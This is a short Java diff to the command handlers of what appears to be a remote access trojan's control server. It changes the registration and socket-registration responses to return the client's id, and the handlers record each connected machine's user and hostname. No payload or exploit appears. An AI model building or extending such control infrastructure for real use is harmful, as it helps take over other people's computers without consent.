@@ -59,7 +59,7 @@ public class DefaultCommands {
 
             connectedRatService.addClient(new RatClient(context.getWtpClient(), uuid, user, hostname, new ArrayList<>()));
 
-            return context.response(0,"Registered client " + user + " " + hostname + " has been added!");
+            return context.response(0, context.getWtpClient().id());
         } catch (Exception e) {
             return context.response(3, "An unexpected error occurred: " + e.getMessage());
         }
@@ -83,7 +83,7 @@ public class DefaultCommands {
             // Notify that new client was registered
             ratClientPoller.notifyRegistered(context.getWtpClient());
 
-            return context.response(0, "Socket successfully added!");
+            return context.response(0, context.getWtpClient().id());
         } catch (IllegalArgumentException e) {
             return context.response(1, "Invalid UUID format: " + context.param("uuid"));
         }
